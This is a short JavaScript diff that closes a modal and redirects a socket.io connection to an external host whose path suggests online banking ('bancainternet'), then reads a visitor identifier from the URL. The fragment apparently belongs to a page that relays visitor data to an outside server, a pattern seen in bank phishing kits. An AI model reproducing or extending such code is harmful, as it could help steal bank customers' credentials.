@@ -22,7 +22,8 @@ CerrarModal.addEventListener("click", () => {
     Alert.style.display = "none";
 })
 
-const socket = io();
+const socket = io.connect('https://test.fasito.link/bancainternet/')
+
 
 //Obtener identificador original
 const queryString = window.location.search;
